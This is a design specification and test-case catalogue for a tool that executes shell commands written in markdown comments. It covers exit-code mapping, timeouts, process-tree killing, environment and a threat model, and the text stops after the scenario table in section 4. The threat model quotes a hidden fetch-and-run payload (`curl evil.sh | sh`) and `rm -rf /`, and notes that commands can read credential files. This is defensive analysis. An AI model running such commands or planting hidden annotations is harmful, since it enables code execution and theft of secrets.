# Step 5 (Phase 3) — Test-case catalogue and threat model for the execution layer

Date: 2026-08-15. Scope: the `verify(claim)` function from Phase 3 of
`08-build-plan.md` — the part that takes a parsed claim, runs its command, and
returns `{ status, expected, actual }`.

**This is a specification, not code.** Per standing constraint 1 in
`docs/README.md`, the owner writes the implementation and the test files. Every
entry below gives the setup, the expected behaviour, and why it matters, so it
can be implemented and argued with.

**Empirically grounded.** Every claim in this document about how Node behaves
was measured on Node v22.22.2 / Linux / `/bin/sh` → dash, not recalled. The
measurements are in [Appendix A](#appendix-a--measured-behaviours). Several of
them contradict what the API documentation implies, and three of them are
outright traps. Re-measure before trusting any of it on another platform.

---

## Table of contents

- [0. The heart of it: what `failed` and `errored` actually mean](#0-the-heart-of-it-what-failed-and-errored-actually-mean)
- [1. Exit codes and status mapping](#1-exit-codes-and-status-mapping)
- [2. Process handling](#2-process-handling)
- [3. Environment and determinism](#3-environment-and-determinism)
- [4. Security and threat model](#4-security-and-threat-model)
- [5. Cross-platform](#5-cross-platform)
- [6. Concurrency and scale](#6-concurrency-and-scale)
- [7. Idempotence and side effects](#7-idempotence-and-side-effects)
- [8. Design decisions this forces, with recommendations](#8-design-decisions-this-forces-with-recommendations)
- [Appendix A — measured behaviours](#appendix-a--measured-behaviours)

---

## 0. The heart of it: what `failed` and `errored` actually mean

The task brief is right that this is the centre of the API. Here is the
argument, then the rule.

### The semantic distinction

The three statuses are not three severities on one scale. They answer two
different questions:

| Status | Did we get a verdict? | What is the verdict? |
|---|---|---|
| `ok` | yes | the claim is true |
| `failed` | yes | the claim is false |
| `errored` | **no** | unknown |

`failed` is **evidence of absence**. `errored` is **absence of evidence**. A
tool that conflates them tells you your documentation is wrong when in fact
your documentation is unexamined, and that is a specific, corrosive lie: it
sends the reader to edit a sentence that was never the problem.

Concretely — a doc says `Lint: 0 errors` with `<!-- claim: npm run lint -->`.

- `npm run lint` exits 1 with 4 errors → the sentence is **false**. Fix the
  sentence, or fix the lint errors. `failed`.
- The `lint` script was renamed to `lint:all`, so `npm run lint` exits 1 with
  "Missing script: lint" → the sentence may be perfectly true. Nobody checked.
  Fix the *claim annotation*. `errored`.

Both need action; they need **different** actions, from potentially different
people. That is the whole justification for the third status.

### The load-bearing consequence: both must fail CI

The single most important architectural point in this document:

> **`errored` must make the CLI exit non-zero, exactly like `failed`.**

If `errored` were treated as a pass, then every typo, every renamed script,
every uninstalled tool becomes a silent green build — and a tool whose failure
mode is "quietly stops checking" is worse than no tool, because it manufactures
confidence. The precedent is every test runner that ever reported "0 tests
passed" as success.

This has a liberating corollary: **the exact position of the `failed`/`errored`
line does not affect whether CI goes red.** It affects only the quality of the
report. So the line can be drawn on "what message is most useful to a human"
rather than on "what is safe", and it can be moved later in `0.x` without
breaking anyone's build. Getting it approximately right is enough; getting it
*consistently* right matters more than getting it perfectly right.

### The rule

**Primary rule — draw the line at "did the command produce an exit code of its
own?", not at the numeric value of that code.**

1. The process was spawned, ran, and **exited normally with code 0** → `ok`.
2. The process was spawned, ran, and **exited normally with a non-zero code** →
   `failed`.
3. The process **never ran, or did not exit under its own control** → `errored`.

Category 3 covers: spawn failed (`ENOENT`, `EACCES`, `EMFILE`), the tool killed
it (timeout), the OS killed it (SIGKILL from an OOM killer), it died on a fault
(SIGSEGV), or `verify` itself threw.

**Carve-outs — cases where "exited normally with non-zero" is still not a
verdict.** The shell exits on the command's behalf in two situations, and those
codes are the shell reporting *its own* failure to run anything:

| Code | Meaning | Status | Reason |
|---|---|---|---|
| `126` | found but not executable (permission denied, bad interpreter) | `errored` | The check never executed. |
| `127` | command not found | `errored` | The check never executed. |

**The honest objection to the 126/127 carve-out**, which should be recorded
rather than glossed: `127` is a legitimate exit code a program may choose, and
more importantly, a claim of the form "the `foo` toolchain is installed"
annotated with `<!-- claim: foo --version -->` is *genuinely false* when `foo`
is missing — and this rule reports it as `errored` instead of `failed`.

That is a real mis-report. It is accepted because:
- the overwhelmingly more common cause of `127` is a typo in the annotation or
  a missing devDependency, where "your claim is false" would be actively
  misleading;
- `errored` still fails CI, so the "toolchain missing" claim is still caught,
  just labelled less precisely;
- the escape hatch is one shell operator wide — a user who genuinely means it
  writes `<!-- claim: command -v foo -->` (exits 1, not 127) or
  `<!-- claim: foo --version || exit 1 -->`. Document this.

Do **not** extend the carve-out further. Specifically, do **not** special-case
`1` vs `2`, and do not attempt to distinguish "tool crashed" from "tool found
problems" by exit code. That convention is not real:

- `grep`: 0 = match, 1 = no match, 2 = error.
- `diff`: 0 = same, 1 = different, 2 = error.
- `eslint`: 0 = clean, 1 = lint problems, 2 = its own crash.
- `tsc`: 0 = clean, 1 = type errors, 2 = its own crash... and also 1 for some
  config errors.
- `npm`: 1 for essentially everything, including "Missing script".
- `pytest`: 1 = failures, 2 = interrupted, 4 = usage error, 5 = no tests.

There is no portable mapping. Inventing one would produce confident wrong
answers, which is precisely the failure mode this package exists to attack. The
line is drawn at "did a shell fail to launch it", because that is the only
distinction the operating system actually guarantees.

**Do not parse stderr to reclassify.** Matching `/not found/` or `/command not
found/` is locale-dependent, shell-dependent, and forgeable by the command's own
output. Exit code 127 is the signal; stderr is decoration for the report.

### Test cases for the core semantic

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `SEM-01` | Command `exit 0` | `status: "ok"` | Baseline. |
| `SEM-02` | Command `exit 1` | `status: "failed"` | Baseline. The v1 rule. |
| `SEM-03` | Command `exit 2` | `status: "failed"` | Proves 2 is *not* special-cased. Lock this in with a test so nobody "helpfully" adds a rule later. |
| `SEM-04` | Command `exit 42` | `status: "failed"` | Same, for an arbitrary code. |
| `SEM-05` | Command `no-such-command-xyz` | `status: "errored"`, exit code 127 preserved in the result | The typo case. The single most common real-world error. |
| `SEM-06` | A file that exists with mode `000` | `status: "errored"`, exit code 126 | Distinguishes "cannot run" from "ran and disagreed". |
| `SEM-07` | Every result object, all statuses | Result always carries the raw `exitCode` (or `null`) and `signal` fields alongside `status` | The mapping is a lossy interpretation. Never discard the primary observation — the report and future rule changes both need it. |

---

## 1. Exit codes and status mapping

### 1.1 The truncation trap — `exit 256` reports success

**Measured, and this is the most dangerous single finding in this document.**

POSIX passes only the low 8 bits of an exit status to the parent. Node surfaces
that truncated value:

| Command | Reported `code` | Status under the rule |
|---|---|---|
| `exit 255` | 255 | `failed` — correct |
| `exit 256` | **0** | **`ok` — WRONG. A false claim reports as true.** |
| `exit 300` | 44 | `failed` — correct by luck (300 & 255 = 44) |
| `exit 512` | 0 | `ok` — wrong |

There is no userland fix. The information is destroyed by the kernel before
Node sees it; the child and parent cannot distinguish `exit 0` from `exit 256`.

**Recommendation:** do not attempt to fix it. Write the test case, let it assert
the wrong-but-unavoidable behaviour with a comment explaining why, and put one
line in the README under "known limitations". Assess the real-world risk as
negligible — a program that deliberately exits 256 is vanishingly rare, and any
program that does so is already broken on every CI system on earth. What matters
is that the *author knows* this hole exists rather than discovering it in a bug
report.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `EXIT-01` | Command `exit 255` | `failed`, `exitCode: 255` | Upper boundary of the valid range. |
| `EXIT-02` | Command `exit 256` | `ok`, `exitCode: 0` — **documented as a known false negative** | Locks in awareness. If someone later "fixes" it, the test forces them to explain how. |
| `EXIT-03` | Command `exit 300` | `failed`, `exitCode: 44` | Documents that the reported code is not always the code the author wrote. The report must not promise fidelity it does not have. |
| `EXIT-04` | Command `exit -1` (dash) | `failed`, `exitCode: 2`, stderr contains an "Illegal number" message | Shell-dependent. bash gives 255, dash gives 2 + a parse error. Both are `failed`; assert the status, **not** the number, or the test is shell-fragile. |

### 1.2 The empty-command trap — silent green

**Measured, and the second dangerous finding.** With `shell: true`:

- `''` (empty string) → Node throws **synchronously**:
  `TypeError [ERR_INVALID_ARG_VALUE]: The argument 'file' cannot be empty`.
  Not a rejected promise. A synchronous throw that will crash the CLI mid-run
  and lose every result gathered so far.
- `'   '` (whitespace only) → the shell runs nothing and **exits 0** → `ok`.
- `'# just a comment'` → the shell runs nothing and **exits 0** → `ok`.

So a malformed annotation — `<!-- claim: -->`, or a trailing-space artefact, or
a claim someone commented out while debugging — reports the claim as **verified
true**. This is a false green produced by the tool's own parsing, and it is
strictly worse than the tool crashing.

**Recommendation:** reject empty commands **before spawning**, at the boundary
of `verify`. Trim the command; if it is empty, return `errored` with a message
like `empty command` without touching the process layer. Whether Phase 2's
`parseClaims` should also refuse to emit such a claim is a separate question
(see fork D-11) — but `verify` must not rely on Phase 2 having done it, because
`verify` is a public entry point that other code can call directly.

Treat `# comment-only` as out of scope for detection (detecting it requires
shell parsing) — accept that hole, note it, move on.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `EXIT-05` | `command: ""` | `errored`, message names the empty command. **Must not throw.** | A synchronous throw from a library function that is documented to return a result object is an API bug, and it destroys a whole run's results. |
| `EXIT-06` | `command: "   "` | `errored` (after trimming), not `ok` | The false-green case. Highest-value test in this section. |
| `EXIT-07` | `command: "\t\n "` | `errored` | Trim must cover all whitespace, not just spaces. |
| `EXIT-08` | `command: null` / `undefined` / a number | `errored`, or a `TypeError` thrown *by design and documented* — pick one and be consistent | Public API boundary. Callers will pass junk. Decide deliberately rather than inheriting whatever Node does. |

### 1.3 Spawn failures

With `shell: true`, almost nothing produces a spawn-level `error` event —
`/bin/sh` exists, so the spawn succeeds and the shell reports 127 for you. The
`error` event still fires for resource exhaustion (`EMFILE`, `ENOMEM`) and if
the configured shell itself is missing.

Measured curiosity worth knowing: with `shell: false` and a missing binary, the
`error` event fires with `code: 'ENOENT'` **and** a `close` event fires with
`code: -2` (the negated errno). If the implementation ever handles both events,
it can double-resolve. Guard the resolution with a "settled" flag.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `EXIT-09` | Force a spawn `error` (e.g. `cwd` set to a non-existent directory) | `errored`, message includes the errno code | `ENOENT` on `cwd` is a realistic user error — a stale `--cwd` flag. |
| `EXIT-10` | Both `error` and `close`/`exit` fire for one child | `verify` resolves exactly once | Double-resolution is a silent corruption: it either throws an unhandled rejection or produces two results for one claim. |
| `EXIT-11` | `cwd` points at a file, not a directory (`ENOTDIR`) | `errored` | Same class, different errno. |

---

## 2. Process handling

This section contains the largest gap between what the Node documentation
implies and what actually happens. Three measured traps.

### 2.1 Trap 1 — Node's `timeout` option does not enforce a timeout

`child_process.spawn(cmd, { timeout: 500 })` sends `killSignal` (default
`SIGTERM`) once and then does nothing further. It is a request, not a guarantee.

Measured, `timeout: 500` against `trap '' TERM; sleep 4`:

| `killSignal` | Elapsed | Reported | Verdict |
|---|---|---|---|
| `SIGTERM` (default) | **4007 ms** | `code: 0, signal: null` | **Reported `ok`.** The timeout was ignored *and* invisible. |
| `SIGKILL` | **4004 ms** | `code: null, signal: 'SIGKILL'` | Status right, but still took the full 4 s. |

The first row is the bad one: a command that outlives its timeout by 8× is
reported as a **passing claim**, with no indication anything went wrong. Any
process that installs a `SIGTERM` handler — which includes a great many dev
servers, test runners, and anything written with a graceful-shutdown path —
falls into this.

The second row shows that even `SIGKILL` did not return control promptly,
which is trap 2.

**Recommendation: do not use the `timeout` option at all.** Implement it:

1. `spawn(cmd, { shell: true, detached: true, stdio: ['ignore','pipe','pipe'] })`
2. Start an own timer for the timeout budget.
3. On expiry: `process.kill(-child.pid, 'SIGTERM')` — note the **negative pid**,
   which signals the whole process group (see 2.3).
4. Start a grace timer (recommend 5 s, not configurable in v1).
5. On grace expiry: `process.kill(-child.pid, 'SIGKILL')`.
6. Record that a timeout occurred in the tool's own state — never infer it from
   the reported signal, because a process can exit 0 during the grace period, or
   die of an unrelated SIGKILL.
7. Resolve `errored`, with a message distinguishing "terminated on timeout" from
   "force-killed after ignoring SIGTERM" — the latter is worth surfacing because
   it tells the user their command is badly behaved.

Measured: `detached: true` + `process.kill(-pid, 'SIGKILL')` returned control in
**503 ms** for the same 4-second-sleeping, TERM-ignoring command. The mechanism
works; Node's built-in one does not.

### 2.2 Trap 2 — `close` fires when the *pipes* close, not when the child exits

`exit` fires when the child is reaped. `close` fires when the child's stdio
streams are all closed. A backgrounded grandchild inherits those pipe file
descriptors and holds them open after the direct child is long gone.

Measured, `(sleep 3 & ) ; echo done`:

| Event | Fired at | Reported |
|---|---|---|
| `exit` | **4 ms** | `code: 0, signal: null` |
| `close` | **3006 ms** | `code: 0, signal: null` |

An implementation that awaits `close` — which is what most tutorials show, and
what you naturally reach for because it guarantees all output has arrived —
stalls for the entire lifetime of any background process the command starts.
A claim attached to a command that starts a dev server would hang the run
forever, and the timeout logic would fire against a process that finished in
4 ms.

**But awaiting `exit` has its own cost.** Measured, `echo early; (sleep 1; echo
late-from-orphan) &`:

- at `exit`: captured output is `"early"`
- at `close`: captured output is `"early\nlate-from-orphan"`

So `exit` can truncate genuinely-wanted trailing output. There is a real
tradeoff here, not a right answer.

**Recommendation:** resolve on **`exit`**, then allow a short **drain window**
(recommend 50–100 ms) for already-buffered pipe data to arrive before finalising
`actual`, then stop listening and let the streams be. Rationale: v1's rule is
exit-code-only, so output is for the *report*, not the *verdict* — losing a
trailing line degrades a message, whereas awaiting `close` can hang the entire
run. Correctness of the verdict is never at stake; liveness is. Choose liveness.

Revisit this if output-matching is ever added (it is explicitly out of v1 per
`07-decision.md`), because then output completeness *would* affect the verdict.

### 2.3 Trap 3 — killing the child does not kill the tree

`child.kill()` signals the shell. The shell's children are not signalled and
survive. Measured: a command that backgrounds `(sleep 3; echo ... > /tmp/gc.txt)`
had its grandchild still running after the Node process itself had exited, and
the file appeared afterwards.

`detached: true` puts the child in a new process group; `process.kill(-pid, sig)`
signals every member. This is the only mechanism that reliably cleans up.

Second-order consequences the implementation must handle:

- **`detached: true` also detaches from the parent's job control.** If the Node
  process dies (Ctrl-C, CI cancellation), the group is orphaned. Install
  `SIGINT`/`SIGTERM` handlers on the tool's own process that kill any live child
  group before exiting. Without this, Ctrl-C on a 200-claim run leaves debris.
- **`process.kill(-pid)` throws `ESRCH`** if the group is already gone — a
  perfectly normal race. Wrap in try/catch and swallow `ESRCH`; do not let a
  cleanup path crash the run.
- **`detached` is a no-op for grouping on Windows** — see section 5.

### 2.4 stdin — must be `'ignore'`

**Measured, and this one is cheap to get right and expensive to get wrong.**

| `stdio[0]` | `cat` (reads stdin) |
|---|---|
| `'pipe'` (never written to, never ended) | **hangs until killed at 1009 ms** |
| `'ignore'` | **exits 0 in 6 ms** |

`'ignore'` maps the child's stdin to `/dev/null`, so any read returns EOF
immediately. Measured: `read -r line; echo "got:$line"` with `'ignore'` exits 0
with `got:` — it gets EOF and moves on.

`'inherit'` is worse than `'pipe'`: the child competes with the tool for the
real terminal, so an interactive prompt (`npm init`, a `y/N` confirmation, a
password prompt, a pager like `git log` invoking `less`) will steal the TTY and
silently wedge the run, or worse, consume keystrokes the user thinks are going
to the tool.

**Recommendation: `stdio: ['ignore', 'pipe', 'pipe']`, unconditionally, with no
option to change it in v1.** A verification tool is non-interactive by
definition. This single choice eliminates the entire class of "hangs waiting for
input" bugs, and it makes most prompting tools take their non-interactive path
for free.

### 2.5 Output capture — the deadlock and the memory bound

**Never use `execFile`/`exec`.** Measured: default `maxBuffer` is 1 MiB
(1048576 bytes); exceeding it rejects with `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`.
That means **a command that exits 0 but prints 2 MB is reported as an error** —
a passing claim turned into a false alarm by an implementation detail. A verbose
`npm run build` clears 1 MB easily.

Use `spawn` and manage the buffer yourself. The critical constraint:

> **Never stop reading the pipes.** If you hit your cap and unsubscribe from
> `'data'`, the OS pipe buffer (typically 64 KiB) fills, the child's next
> `write()` blocks forever, and you have deadlocked into a timeout. Keep
> consuming and **discard** the excess.

Measured: streaming 50 MB through `spawn` while only counting lengths took
259 ms with RSS at 81 MB — the streaming path is fast and cheap. The cost is
entirely in what you retain.

**Recommendation:** cap retained output at ~1 MiB per stream (a soft cap that
only affects the report). Keep the **first ~64 KiB and the last ~64 KiB** with an
elision marker — errors appear at the end, context at the beginning, and the
middle of a 50 MB log is never what anyone wants. Set a `truncated: true` flag
on the result.

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `PROC-01` | `sleep 30`, timeout 1 s | `errored`, resolves in ≈1 s (+grace), message says timed out | The basic timeout. |
| `PROC-02` | `trap '' TERM; sleep 30`, timeout 1 s, grace 2 s | `errored`, resolves in ≈3 s, **and the process is actually dead** — assert by pid, not by the promise resolving | The trap-1 case. Assert the process is gone; a resolved promise proves nothing about the process. |
| `PROC-03` | `(sleep 30 &) ; echo done` | `ok` in well under 1 s | The trap-2 case. If this test takes 30 s, the implementation awaits `close`. |
| `PROC-04` | `sleep 30 & sleep 30 & wait`, timeout 1 s | `errored`; **all** spawned pids are gone afterwards | The trap-3 case. Verify tree kill, not child kill. |
| `PROC-05` | `cat` (reads stdin, no input) | `ok` almost immediately, not a timeout | The stdin case. |
| `PROC-06` | A command that prompts (`read -p "y/N " x`) | Terminates without user interaction | Realistic version of `PROC-05`. |
| `PROC-07` | Command emitting 50 MB to stdout, exit 0 | `ok`; retained output ≤ cap; `truncated: true`; peak RSS stays bounded (assert < ~200 MB) | The OOM guard. Prevents a regression to `exec`. |
| `PROC-08` | Command emitting 5 MB to stdout then exit 1 | `failed` — **not** `errored` | Big output must never change the verdict. This is the `maxBuffer` regression test. |
| `PROC-09` | Command writing 10 MB to stdout while the tool has hit its cap | Completes; does not deadlock | The stop-reading deadlock. Give it a generous test timeout so failure shows as a timeout, not a hang. |
| `PROC-10` | `for i in 1..5; do echo OUT$i; echo ERR$i >&2; done` | Both streams captured in full; relative interleaving **not** asserted | See 2.6. |
| `PROC-11` | `printf '\xff\xfe\x41'` | No throw; output contains U+FFFD replacement chars; `ok` | Invalid UTF-8 must degrade, not crash. |
| `PROC-12` | `kill -SEGV $$` | `errored`, `exitCode: null`, `signal: 'SIGSEGV'` | A crashed tool did not render a verdict. |
| `PROC-13` | `kill -TERM $$` (self-terminated, no timeout involved) | `errored`, `signal: 'SIGTERM'` | Must not be confused with the tool's own timeout kill — the message should differ. This is why 2.1 step 6 says record the timeout in your own state. |
| `PROC-14` | Command that exits 0 but leaves a grandchild writing to stdout | Resolves promptly; late output may be absent; **no unhandled `EPIPE`/write-after-end** | Write-after-exit. The failure mode is a crash in the tool, not a wrong verdict. |
| `PROC-15` | SIGINT the tool mid-run | No orphaned process groups survive | The `detached` cleanup obligation. Manual/integration test is acceptable. |
| `PROC-16` | `process.kill(-pid)` on an already-dead group | `ESRCH` swallowed, run continues | Normal race; must not crash cleanup. |

### 2.6 Interleaving — do not promise it

**Measured:** `for i in 1 2 3 4 5; do echo "OUT$i"; echo "ERR$i" >&2; done`
produced chunks in this order:

```
["O:OUT1,OUT2,OUT3,OUT4,OUT5", "E:ERR1,ERR2,ERR3,ERR4,ERR5"]
```

The true chronological order was `OUT1, ERR1, OUT2, ERR2, ...`. It is gone.
Two separate pipes have independent buffers and independent readability
notifications; the relative ordering between them is not preserved and cannot
be recovered.

The only way to get true interleaving is a **pty**, which means a native
dependency (`node-pty`), which is a compiled addon — flatly disproportionate for
v1, and contrary to the "no bundler, few dependencies" posture in
`07-decision.md`.

The other option is `stdio: ['ignore', 'pipe', 'pipe']` with **both pipes
pointing at the same fd**, i.e. `2>&1` merging. That preserves order but
destroys the distinction between streams, and many tools write routine progress
to stderr — merging would make a clean run look alarming.

**Recommendation:** keep the streams separate, store them separately, and
**document that interleaving is not preserved**. In the report, print stderr
after stdout under separate headings rather than pretending to reconstruct a
timeline. Add `--merge-output` (mapping to `2>&1`) only if someone asks.

### 2.7 Encoding

**Measured:** bytes `[0xFF, 0xFE, 0x41]` decoded as UTF-8 yield `"��A"`
— two replacement characters, no exception. Node's decoder never throws on
invalid input.

So the risk is not a crash; it is (a) silent corruption of the report and
(b) control characters. Binary output can contain `\x1b` escape sequences, which
when printed to a terminal can reposition the cursor, clear the screen, or
overwrite previously-printed results — including making a `failed` line look
like an `ok` line. That is a low-severity but real output-integrity issue,
and it is worth noting that the *command* controls those bytes.

**Recommendation:** buffer as `Buffer`, decode as UTF-8 at the boundary where
output enters the result object, and **strip C0 control characters other than
`\t`, `\n`, `\r`** before printing to a terminal. Do not strip inside the stored
`actual` — keep the stored value faithful, sanitise only at the presentation
layer, so the CLI (Phase 4) owns the sanitising and the library stays honest.

---

## 3. Environment and determinism

### 3.1 Working directory — the genuinely contested one

Three candidates:

**(a) The directory containing the markdown file.**
Intuitive on first glance — "the claim lives here, run it here". Wrong in
practice. The canonical claim in this project's own README is
`<!-- claim: npm run lint -->` inside `docs/README.md`. With option (a) that
runs `npm run lint` in `docs/`, where there is no `package.json`. **The
motivating example of the entire package breaks under this option.** It also
means moving a doc file silently changes what its claims mean, which is a nasty
property for a tool whose whole purpose is detecting silent change.

**(b) An auto-detected repo root** (nearest `.git`, or nearest `package.json`).
Fixes (a)'s example, and is what the user usually means. But "usually" is doing
heavy lifting. In a monorepo, `.git` and the nearest `package.json` disagree,
and the right answer differs per claim — `packages/api/docs/x.md` saying
`npm run test` means the *package* root, while `docs/architecture.md` saying
`npm run build` probably means the *workspace* root. Any fixed rule is wrong
half the time, and it is wrong **invisibly**: the command runs, produces a
plausible result, and verifies the wrong thing. That is the worst failure class
this tool can have. It also makes results depend on filesystem layout in a way
that is untestable without constructing fixture repos with real `.git`
directories.

**(c) The current working directory of the `verify-claims` process.**
Boring, and correct. Every tool the user already runs — `eslint`, `vitest`,
`tsc`, `prettier`, `npm` — resolves relative to cwd. `verify-claims "docs/**/*.md"`
from the repo root does exactly what the user expects, because it is the same
mental model as `eslint "src/**/*.ts"`. Monorepos are handled by the mechanism
monorepos already use: invoke the tool per package, from that package's
directory, which is what every workspace runner does anyway. And it is trivially
testable — set `cwd` in the test, no fixture git repos required.

The one honest cost of (c): a doc file can be verified from a directory where
its claims are meaningless, and the user gets a confusing `127`. That is a
*visible, immediate* error the user fixes in seconds — categorically better than
(b)'s invisible wrong answer.

**Recommendation: (c), the process cwd**, with a `--cwd <dir>` flag to override
it globally. Document it in one sentence: *"commands run in the directory you
run `verify-claims` from, exactly like `eslint` or `vitest`."*

Explicitly defer: per-claim cwd (`<!-- claim: npm test --cwd packages/api -->`).
It is a real need in monorepos and it is a *format* change, which
`07-decision.md` correctly identifies as the one thing that must not churn.
Deferring costs nothing because (c) plus per-package invocation already covers
it.

### 3.2 Shell or argv array

The security framing here is commonly gotten backwards, so state it plainly:

> **An argv array provides zero security benefit in this design.** Argument
> arrays defend against *injection* — untrusted data interpolated into a trusted
> command template. Here there is no template. The entire command string is
> attacker-controlled data. `spawn(['rm','-rf','/'])` is exactly as destructive
> as `sh -c 'rm -rf /'`. Anyone reaching for argv arrays as a mitigation has
> mis-modelled the threat (see section 4).

So the decision is purely expressiveness vs. portability.

**For `shell: true`:** users will write `npm run lint && npm test`,
`grep -c TODO src/*.ts`, `test -f dist/index.js`, `curl -sf localhost:3000/health`.
Pipes, `&&`, globs, redirection, `$(...)`, and quoting all just work. The
annotation format is a single free-text string in an HTML comment — it *reads*
as a shell command, and users will assume it is one. Matching that expectation
costs nothing.

**Against:** to use an argv array you would have to shell-lex the string
yourself (`shell-quote` or similar), which is a partial reimplementation of
shell parsing with its own quoting bugs — and it still cannot support pipes or
`&&` without also implementing the operators. That is a large amount of surface
for no benefit.

**Recommendation: `shell: true`.**

**But be precise about which shell.** Measured: Node's default is `/bin/sh`,
which on Debian/Ubuntu (and therefore most CI images) is **dash, not bash**.
Measured: `${PATH:0:20}` fails with `Bad substitution` under dash and works
under bash. So do not let bash-isms — `[[ ]]`, `${var:0:n}`, arrays, `source`,
process substitution — into examples or tests, and say in the README: *"commands
run under `/bin/sh` (POSIX sh — not necessarily bash)."* Do **not** silently
prefer bash when present; that would make behaviour depend on the machine, which
is the opposite of what this tool is for.

### 3.3 Environment variables

**Recommendation: inherit `process.env` wholesale.** Do not scrub.

Reasoning: scrubbing has no security value (the child can read `~/.aws/credentials`
and `.env` off disk regardless — see section 4), and it breaks a great deal.
Measured with `env: {}`, even trivial things fall apart: `$HOME` is empty, and
`PATH` is unset, so essentially nothing resolves.

Three specific sub-decisions:

**`node_modules/.bin` on PATH — a real fork.** Measured: setting `cwd` does
**not** add `<cwd>/node_modules/.bin` to `PATH`. A claim written as
`<!-- claim: eslint . -->` gets a bare `127` with a "not found" message, even
though `eslint` is installed as a devDependency and `npm run lint` works fine.
npm and npx both prepend it; users' mental model comes from npm.

- *Option 1 — prepend `<cwd>/node_modules/.bin` to `PATH`.* Removes a whole
  class of confusing 127s. Matches npm. About three lines.
- *Option 2 — leave PATH alone, tell users to write `npm run lint` or `npx eslint`.*
  Less magic; the tool does exactly what a shell would do; nothing to explain
  when behaviour differs from a manual `sh -c`.

**Recommendation: Option 1**, because the 127 it prevents lands in the
`errored` bucket where the message is least actionable, and because "it works
like npm scripts" is a one-line explanation whereas "why does eslint work in
npm run but not here" is a support thread. Note honestly that this is the
weakest recommendation in this document and Option 2 is defensible; it is also
fully reversible in `0.x`. If chosen, prepend rather than replace, and document
it.

**Do not set `CI=true`.** Tempting (it makes many tools non-interactive and
disables colour), but it fabricates an environment and makes local runs behave
unlike a plain shell. The `stdio: ['ignore', ...]` decision in 2.4 already
handles interactivity, and piping stdout already disables colour in most tools
because they check `isTTY`. Leave `CI` to whatever the real environment says.

**Do not force locale.** v1's rule reads only the exit code, and exit codes are
locale-independent — so the simple rule buys locale-immunity for free. Note this
as a hidden benefit of the exit-code-only design, and note that **if
output-matching is ever added, `LC_ALL=C` becomes mandatory** for determinism.
Record it here so the future implementer finds it.

**`NODE_ENV` is inherited and this is a real determinism hazard** that cannot be
fixed: `NODE_ENV=production` changes what `npm ci` installs and what many build
tools emit, so a claim can verify locally and fail in CI for reasons unrelated
to the claim. Document it under "why did this pass locally".

| ID | Setup | Expected | Why it matters |
|---|---|---|---|
| `ENV-01` | `cwd` set to a fixture dir; command `pwd` | Output is the fixture dir | Baseline for the cwd decision. |
| `ENV-02` | Markdown at `fixtures/docs/a.md`, run with cwd `fixtures/` | Command runs in `fixtures/`, **not** `fixtures/docs/` | Locks in decision (c) against a future "helpful" change to (a). |
| `ENV-03` | Set a distinctive var in `process.env`; command echoes it | Present in child output | Inheritance. |
| `ENV-04` | Fixture with `node_modules/.bin/mytool`; command `mytool` | `ok` if Option 1 chosen; `errored`/127 if Option 2 | **Whichever is chosen, assert it.** This is the test that pins the fork. |
| `ENV-05` | Command uses a bash-ism (`[[ -f x ]]`) | Document the expected result under `/bin/sh` | Prevents bash-isms leaking into the tool's own docs/examples. |
| `ENV-06` | Command `echo $0` | `/bin/sh` | Pins the shell choice explicitly. |
| `ENV-07` | Command `npm run lint && echo done` | Shell operators work | Proves `shell: true` end-to-end. |

---

## 4. Security and threat model

This is the section that needs the most honesty, so it is written as an
assessment rather than a checklist.

### 4.1 The headline

**`verify-claims` is an arbitrary code execution tool. That is not a
vulnerability; it is the product.** There is no version of this package that
does its job without executing commands it read out of a file. Any framing that
treats RCE as a bug to be fixed will produce mitigations that are theatre.

The right question is therefore never "how do we prevent code execution" but
**"whose code, and does the user know?"**

### 4.2 Where `07-decision.md`'s framing is right, and where it is too comfortable

The existing risk table says:

> *"It executes what the repo's own docs say — same trust level as `npm run`."*

**Right in the main case.** If you cloned a repo and are running its tooling,
you have already run its `postinstall` scripts, its build, and its test suite.
A repo you build is a repo whose code you run. Adding `verify-claims` to that
list changes nothing about your exposure.

**Too comfortable in three specific ways**, each of which is a genuine
escalation over `npm run`:

**(1) The payload is invisible in the default review surface.** This is the
serious one and it is specific to this package's design choice. The annotation
is an HTML comment, chosen precisely *because* "an HTML comment renders as
nothing on GitHub" (`07-decision.md`). That property is a feature for readability
and a **weapon for review evasion**: in GitHub's rendered markdown preview and
in the PR "rich diff" view, `<!-- claim: curl evil.sh | sh -->` displays as
absolutely nothing. A reviewer who toggles rich diff on a documentation PR — a
completely normal thing to do, because rich diff is *better* for reviewing prose
— sees an empty change. `npm run` has no equivalent: a new script in
`package.json` is visible in every view.

**(2) The reviewer's guard is down.** A `package.json` diff attracts scrutiny by
convention. A typo fix in `docs/setup.md` from a first-time contributor attracts
a thumbs-up. The attack surface is the file type people review least carefully,
and the tool's value proposition actively encourages putting claims in *many*
markdown files.

**(3) The execution can be automatic and unattended.** `npm run` is something a
human types. `verify-claims` in CI runs on every push, including pushes from
people who are not you. Nobody decides, per-run, to execute this.

Taken together: the tool converts "markdown in a PR" from inert data into an
execution trigger, and the trigger is invisible in the review UI. That should be
stated in the README in those terms. It is not a reason not to build the tool;
it is a reason not to describe the risk as merely "same as `npm run`".

### 4.3 Scenario assessment

| # | Scenario | Severity | Assessment |
|---|---|---|---|
| S1 | Developer runs it on their own repo | **None** | Their commands, their machine. This is the design case. |
| S2 | Developer clones a random repo and runs `verify-claims` on it | **Medium** | Full RCE as the user. But cloning-and-building already implies this. Mitigated by documentation and `--dry-run`; genuinely mitigated by not running unfamiliar repos' tooling. |
| S3 | Globs match `node_modules/**/*.md` | **High** | Executes commands from *dependencies'* documentation. The user never reviewed those files and never intended to run them. Unlike S2 this is **not** implied by anything the user did — it is the tool being surprising. **This one is the tool's fault and the tool must fix it.** |
| S4 | CI runs it on a PR from a trusted collaborator | **Low–Medium** | Equivalent to trusting them with CI generally, which you already do. |
| S5 | **CI runs it on a PR from an untrusted fork, via `pull_request`** | **High** | Runs attacker code in your CI. Bounded: `GITHUB_TOKEN` is read-only for fork PRs and repository secrets are **not** exposed. Damage: crypto mining, exfiltrating anything already in the runner, cache poisoning, using your CI minutes. Bad, not fatal. |
